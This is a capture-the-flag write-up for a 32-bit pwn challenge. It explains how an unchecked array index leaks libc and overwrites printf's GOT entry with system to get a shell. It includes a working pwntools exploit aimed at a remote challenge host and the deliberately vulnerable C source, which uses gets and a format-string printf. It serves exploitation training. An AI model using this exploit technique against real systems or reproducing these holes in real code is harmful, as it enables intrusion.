# Reactor_GOT

### Author

[b3y0nd3r](https://twitter.com/GeethnaTk)
[rudyerudite](https://twitter.com/rudyerudite)


### Description

The Reactor seems to be infuritating. The control programs, running in APEX controller machine, seems to be messing up in computing. Officials call Kathleen to the save the day. Can you help her in reaching the Reactor on time?

PS: This challenge use the new updated Ubuntu 18.04 libc

### Writeup

Before getting our hands dirty on the binary, we execute a initial `checksec chall` which tells us about the mitigations enabled on the binary.
`
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
` 

`RelRO` is partial - gives us a possibility of overwriting the GOT table and in turn calling the function of our choice. Let's see if we find a primitive to achieve this. Mind you this is a 32-bit binary (do a `file chall`) which means the addresses are going to be 4 bytes. To learn more about the GOT table [lookup here](https://www.youtube.com/watch?v=kUk5pw4w0h4). Also, PIE is disabled as well- address of the GOT table is unrandomized each time.

Let's get started with the challenge, we have 3 options here: `add`, `show`, `break_armour`. Mind you reactor here is a global array declared as: `char *reactor[3][4]`. 

```C
void add(){

	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	puts("Enter the data :");
	read(0,reactor[idx],0x4);
		
}
```
Nothing really looks suspicious here other than the signed `idx`. A possibility of integer overflow? Also, we can allocate/ write anything at `reactor+idx` , so if negative values of `idx` are allowed we can truly cause a havoc by overwriting the GOT table. As our `reactor` is stored on BSS and so is your GOT table plus you know it's address. Thus calculating the right offset would help us overwriting the GOT table! That's super awesome, but what will you overwrite with? Well, at the end all we want is a shell so overwriting with the `libc system` or any of the `gadgets` would help us. I followed the former easier approach.

```C
void show(){
	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	if(reactor[idx])
		printf("%s\n",reactor[idx]);
	else
		puts("Not allocated!");
}
``` 
Another thing to notice here is that there is no check on the `idx` which can be used to print the data stored at `reactor+(-idx)` location. I used this to get `libc` leaks as these addresses are randomized on each run because of `ASLR`. From the leaks I could calculate the address of `system` and I overwrote GOT table entry of `printf` with it. 

I used the 3rd option here, `printf(break_)` where `break_` is '/bin/sh'. Lo and behold, the shell pops up and you `cat` your `flag`. As an alternative to getting leaks using the `show` function you can use the `format string` vulnerability in `printf(break_)` and get the required leaks. 

### Exploit
```python
from pwn import *
#p = process("./chall")

p = remote('34.72.218.129',5555)

def add(idx,data):
    p.sendlineafter("MELTDOWN)\n","1")
    p.sendlineafter("index :\n",str(idx))
    p.sendlineafter("data :\n",data)

def show(idx):
    p.sendlineafter("MELTDOWN)\n","2")
    
    p.sendlineafter("Enter the index :\n",str(idx))
def leave():
    p.sendlineafter("MELTDOWN)\n","3")

p.sendline("/bin/sh\x00")
show("268435454")

print("leaks:")
leak = u32(p.recvline()[:4].strip().ljust(4,'\x00'))
print(hex(leak))
base = leak - 0x1d55c0
system = base + 0x3ce10
add("268435449",p32(system))
#gdb.attach(p)

leave()
p.interactive()
```

### Source Code

```C
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

char *reactor[3][4];


void initialize()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}
void printmenu(){

	puts("Choose your ACTION:");
	puts("1. add");
	puts("2. show");
	puts("3. break armour");
}
void add(){

	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	puts("Enter the data :");
	read(0,reactor[idx],0x4);
		
}

void show(){
	int idx;
	puts("Enter the index :");
	scanf("%d",&idx);
	if(reactor[idx])
		printf("%s\n",reactor[idx]);
	else
		puts("Not allocated!");
}

int main()
{
	int choice;
	int c = 0;
	initialize();
	char break_[8];
	printf("ARMOUR: enabled! Try to break in ;)");
	gets(break_);
	while(c != 3){
		puts("Welcome to The Reactor (current status: MELTDOWN)");
		printmenu();
		scanf("%d",&choice);
		if(choice == 1)
			add();
		else if(choice == 2)
			show();
		else if(choice == 3)
			{
				printf(break_);
			}
		else
			exit(0);
		c += 1;
	}
	return 0;
}
```
